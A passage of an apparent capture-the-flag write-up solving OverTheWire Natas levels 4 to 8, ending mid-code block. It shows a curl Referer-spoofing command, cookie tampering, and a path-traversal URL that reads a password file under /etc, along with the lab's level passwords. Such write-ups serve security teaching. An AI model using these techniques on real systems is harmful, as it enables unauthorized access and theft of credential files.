+<p>Starting this off by going to: <a href="http://natas4.natas.labs.overthewire.org/">http://natas4.natas.labs.overthewire.org/</a></p>
+<p>Login info is:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">User: natas4
+Pass: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+</code></pre></td></tr></table>
+</div>
+</div><p>Seems that the challenges are starting to ramp up in difficulty. There&rsquo;s no opened directories here, nothing obvious in the source. Just a message stating it expects us to come from <code>natas5</code> URL:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">Access</span> <span class="n">disallowed.</span> <span class="n">You</span> <span class="n">are</span> <span class="n">visiting</span> <span class="n">from</span> <span class="s">&#34;http://natas4.natas.labs.overthewire.org/index.php&#34;</span> <span class="n">while</span> <span class="n">authorized</span> <span class="n">users</span> <span class="n">should</span> <span class="n">come</span> <span class="n">only</span> <span class="n">from</span> <span class="s">&#34;http://natas5.natas.labs.overthewire.org/&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>The hint pretty clearly states what needs to be done: spoof our referring address. We should be able to leverage <code>curl</code> again to spoof our referring.</p>
+<p>Details here about <code>curl</code>'s referring from the man pages:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s">       <span class="o">-</span><span class="n">e</span><span class="p">,</span> <span class="o">--</span><span class="n">referer</span> <span class="o">&lt;</span><span class="n">URL</span><span class="o">&gt;</span>
+              <span class="p">(</span><span class="n">HTTP</span><span class="p">)</span> <span class="n">Sends</span> <span class="n">the</span> <span class="s">&#34;Referrer Page&#34;</span> <span class="n">information</span> <span class="n">to</span> <span class="n">the</span> <span class="n">HTTP</span> <span class="n">server.</span> <span class="n">This</span> <span class="n">can</span> <span class="n">also</span>  <span class="n">be</span>  <span class="n">set</span> <span class="n">with</span>  <span class="n">the</span>  <span class="o">-</span><span class="n">H</span><span class="p">,</span>  <span class="o">--</span><span class="n">header</span>  <span class="n">flag</span> <span class="n">of</span> <span class="n">course.</span>
+<span class="n">When</span> <span class="n">used</span> <span class="n">with</span> <span class="o">-</span><span class="n">L</span><span class="p">,</span> <span class="o">--</span><span class="n">location</span> <span class="n">you</span> <span class="n">can</span> <span class="n">append</span> <span class="s">&#34;;auto&#34;</span> <span class="n">to</span> <span class="n">the</span> <span class="o">-</span><span class="n">e</span><span class="p">,</span> <span class="o">--</span><span class="n">referer</span> <span class="n">URL</span> <span class="n">to</span> <span class="n">make</span> <span class="n">curl</span> <span class="n">automatically</span> <span class="n">set</span> <span class="n">the</span> <span class="n">previous</span>  <span class="n">URL</span>  <span class="n">when</span> <span class="n">it</span>  <span class="n">follows</span> <span class="n">a</span> <span class="n">Location</span><span class="o">:</span> <span class="n">header.</span>
+<span class="n">The</span> <span class="s">&#34;;auto&#34;</span> <span class="n">string</span> <span class="n">can</span> <span class="n">be</span> <span class="n">used</span> <span class="n">alone</span><span class="p">,</span> <span class="n">even</span> <span class="n">if</span> <span class="n">you</span> <span class="n">don</span><span class="s">&#39;</span><span class="err">t set an initial -e, --referer.</span>
+
+<span class="n">If</span> <span class="n">this</span> <span class="n">option</span> <span class="n">is</span> <span class="n">used</span> <span class="n">several</span> <span class="n">times</span><span class="p">,</span> <span class="n">the</span> <span class="n">last</span> <span class="n">one</span> <span class="n">will</span> <span class="n">be</span> <span class="n">used.</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>And putting it all together on the commandline:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html">$ curl -u natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ -e http://natas5.natas.labs.overthewire.org/  http://natas4.natas.labs.overthewire.org -v
+* Rebuilt URL to: http://natas4.natas.labs.overthewire.org/
+*   Trying 176.9.9.172...
+* TCP_NODELAY set
+* Connected to natas4.natas.labs.overthewire.org (176.9.9.172) port 80 (#0)
+* Server auth using Basic with user &#39;natas4&#39;
+&gt; GET / HTTP/1.1
+&gt; Host: natas4.natas.labs.overthewire.org
+&gt; Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va
+&gt; User-Agent: curl/7.54.0
+&gt; Accept: */*
+&gt; Referer: http://natas5.natas.labs.overthewire.org/
+&gt;
+<span class="p">&lt;</span> <span class="nt">HTTP</span><span class="err">/</span><span class="na">1</span><span class="err">.</span><span class="na">1</span> <span class="na">200</span> <span class="na">OK</span>
+<span class="err">&lt;</span> <span class="na">Date:</span> <span class="na">Mon</span><span class="err">,</span> <span class="na">20</span> <span class="na">Jan</span> <span class="na">2020</span> <span class="na">05:38:03</span> <span class="na">GMT</span>
+<span class="err">&lt;</span> <span class="na">Server:</span> <span class="na">Apache</span><span class="err">/</span><span class="na">2</span><span class="err">.</span><span class="na">4</span><span class="err">.</span><span class="na">10</span> <span class="err">(</span><span class="na">Debian</span><span class="err">)</span>
+<span class="err">&lt;</span> <span class="na">Vary:</span> <span class="na">Accept-Encoding</span>
+<span class="err">&lt;</span> <span class="na">Content-Length:</span> <span class="na">962</span>
+<span class="err">&lt;</span> <span class="na">Content-Type:</span> <span class="na">text</span><span class="err">/</span><span class="na">html</span><span class="err">;</span> <span class="na">charset</span><span class="o">=</span><span class="s">UTF-8</span>
+<span class="err">&lt;</span>
+<span class="err">&lt;</span><span class="na">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="c">&lt;!-- This stuff in the header has nothing to do with the level --&gt;</span>
+<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/css&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/css/level.css&#34;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/css/jquery-ui.css&#34;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/css/wechall.css&#34;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/js/jquery-ui.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">http://natas.labs.overthewire.org/js/wechall-data.js</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/js/wechall.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="kd">var</span> <span class="nx">wechallinfo</span> <span class="o">=</span> <span class="p">{</span> <span class="s2">&#34;level&#34;</span><span class="o">:</span> <span class="s2">&#34;natas4&#34;</span><span class="p">,</span> <span class="s2">&#34;pass&#34;</span><span class="o">:</span> <span class="s2">&#34;Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ&#34;</span> <span class="p">};&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>natas4<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;content&#34;</span><span class="p">&gt;</span>
+
+Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+<span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;viewsource&#34;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;index.php&#34;</span><span class="p">&gt;</span>Refresh page<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="natas5">natas5</h3>
+<p>Starting this off by going to: <a href="http://natas5.natas.labs.overthewire.org/">http://natas5.natas.labs.overthewire.org/</a></p>
+<p>Login info is:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">User: natas5
+Pass: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+</code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>&ldquo;Access disallowed. You are not logged in&rdquo;</p>
+</blockquote>
+<p>Well, checking the source, nothing. Guessing from this point forth the password won&rsquo;t be easily found in the source. Looking through it thought, there&rsquo;s no obvious hints.</p>
+<p>Time to poke around a bit more with the Developer Tools.</p>
+<p>This time looking at traffic. Nothing interesting.</p>
+<p>Time to check Storage, and see what cookies exist. Looks like there&rsquo;s a cookie that checks to see if the user is logged in or not. Setting the value of <code>loggedin</code> from 0 to 1 and then refreshing the page.</p>
+<p>Great success:</p>
+<blockquote>
+<p>Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</p>
+</blockquote>
+<p>On to the next level.</p>
+<h3 id="natas6">natas6</h3>
+<p>Starting this off by going to: <a href="http://natas6.natas.labs.overthewire.org/">http://natas6.natas.labs.overthewire.org/</a></p>
+<p>Login info is:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">User: natas6
+Pass: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+</code></pre></td></tr></table>
+</div>
+</div><p>Greeted with a form that expects some sort of secret code and a button that allows for viewing the source. Looking at the source, let&rsquo;s see what&rsquo;s going on.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="c">&lt;!-- This stuff in the header has nothing to do with the level --&gt;</span>
+<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/css&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/css/level.css&#34;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/css/jquery-ui.css&#34;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/css/wechall.css&#34;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/js/jquery-ui.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">http://natas.labs.overthewire.org/js/wechall-data.js</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/js/wechall.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="kd">var</span> <span class="nx">wechallinfo</span> <span class="o">=</span> <span class="p">{</span> <span class="s2">&#34;level&#34;</span><span class="o">:</span> <span class="s2">&#34;natas6&#34;</span><span class="p">,</span> <span class="s2">&#34;pass&#34;</span><span class="o">:</span> <span class="s2">&#34;&lt;censored&gt;&#34;</span> <span class="p">};&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>natas6<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;content&#34;</span><span class="p">&gt;</span>
+
+<span class="cp">&lt;?
+</span><span class="cp">
+</span><span class="cp">include &#34;includes/secret.inc&#34;;
+</span><span class="cp">
+</span><span class="cp">    if(array_key_exists(&#34;submit&#34;, $_POST)) {
+</span><span class="cp">        if($secret == $_POST[&#39;secret&#39;]) {
+</span><span class="cp">        print &#34;Access granted. The password for natas7 is &lt;censored&gt;&#34;;
+</span><span class="cp">    } else {
+</span><span class="cp">        print &#34;Wrong secret&#34;;
+</span><span class="cp">    }
+</span><span class="cp">    }
+</span><span class="cp">?&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">post</span><span class="p">&gt;</span>
+Input secret: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">secret</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">submit</span> <span class="na">name</span><span class="o">=</span><span class="s">submit</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;viewsource&#34;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;index-source.html&#34;</span><span class="p">&gt;</span>View sourcecode<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Looks like the <code>secret.inc</code> seems like a good place to go poking around:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">view-source:http://natas6.natas.labs.overthewire.org/includes/secret.inc
+
+<span class="cp">&lt;?</span>
+<span class="nv">$secret</span> <span class="o">=</span> <span class="s2">&#34;FOEIUWGHFEEUHOFUOIU&#34;</span><span class="p">;</span>
+<span class="cp">?&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Guessing the secret here is what the form needs, after inputting the secret:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">Access</span> <span class="n">granted.</span> <span class="n">The</span> <span class="n">password</span> <span class="n">for</span> <span class="n">natas7</span> <span class="n">is</span> <span class="m">7</span><span class="n">z3hEENjQtflzgnT29q7wAvMNfZdh0i9</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="natas7">natas7</h3>
+<p>Starting this off by going to: <a href="http://natas7.natas.labs.overthewire.org/">http://natas7.natas.labs.overthewire.org/</a></p>
+<p>Login info is:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">User: natas7
+Pass: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+</code></pre></td></tr></table>
+</div>
+</div><p>Two links to poke around, &ldquo;Home&rdquo; and &ldquo;About&rdquo;. Something interesting must be behind these links that will get the password to the next level. Clicking on the links changes this the URL:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">http</span><span class="o">://</span><span class="n">natas7.natas.labs.overthewire.org</span><span class="o">/</span><span class="n">index.php</span><span class="o">?</span><span class="n">page</span><span class="o">=</span><span class="n">home</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>And looking at the source for the two pages both reveal a hint:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"><span class="c">&lt;!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>It may be possible to use the <code>page=</code> and give it any location wanted, this is possible since ultimately a webserver is just serving up content that is available in different directories located on a webserver:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html">http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+</code></pre></td></tr></table>
+</div>
+</div><p>And then the password is printed for us:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="natas8">natas8</h3>
+<p>Starting this off by going to: <a href="http://natas8.natas.labs.overthewire.org/">http://natas8.natas.labs.overthewire.org/</a></p>
+<p>Login info is:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">User: natas8
+Pass: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+</code></pre></td></tr></table>
+</div>
+</div><p>Another form. This time looking at the source:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="c">&lt;!-- This stuff in the header has nothing to do with the level --&gt;</span>
+<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/css&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/css/level.css&#34;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/css/jquery-ui.css&#34;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/css/wechall.css&#34;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/js/jquery-ui.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">http://natas.labs.overthewire.org/js/wechall-data.js</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;http://natas.labs.overthewire.org/js/wechall.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="kd">var</span> <span class="nx">wechallinfo</span> <span class="o">=</span> <span class="p">{</span> <span class="s2">&#34;level&#34;</span><span class="o">:</span> <span class="s2">&#34;natas8&#34;</span><span class="p">,</span> <span class="s2">&#34;pass&#34;</span><span class="o">:</span> <span class="s2">&#34;&lt;censored&gt;&#34;</span> <span class="p">};&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>natas8<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;content&#34;</span><span class="p">&gt;</span>
+
+<span class="cp">&lt;?
+</span><span class="cp">
+</span><span class="cp">$encodedSecret = &#34;3d3d516343746d4d6d6c315669563362&#34;;
+</span><span class="cp">
+</span><span class="cp">function encodeSecret($secret) {
+</span><span class="cp">    return bin2hex(strrev(base64_encode($secret)));
+</span><span class="cp">}
+</span><span class="cp">
+</span><span class="cp">if(array_key_exists(&#34;submit&#34;, $_POST)) {
+</span><span class="cp">    if(encodeSecret($_POST[&#39;secret&#39;]) == $encodedSecret) {
+</span><span class="cp">    print &#34;Access granted. The password for natas9 is &lt;censored&gt;&#34;;
+</span><span class="cp">    } else {
+</span><span class="cp">    print &#34;Wrong secret&#34;;
+</span><span class="cp">    }
+</span><span class="cp">}
+</span><span class="cp">?&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">post</span><span class="p">&gt;</span>
+Input secret: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">secret</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">submit</span> <span class="na">name</span><span class="o">=</span><span class="s">submit</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;viewsource&#34;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;index-source.html&#34;</span><span class="p">&gt;</span>View sourcecode<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Looks like the interesting thing here is the encodeSecret function.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
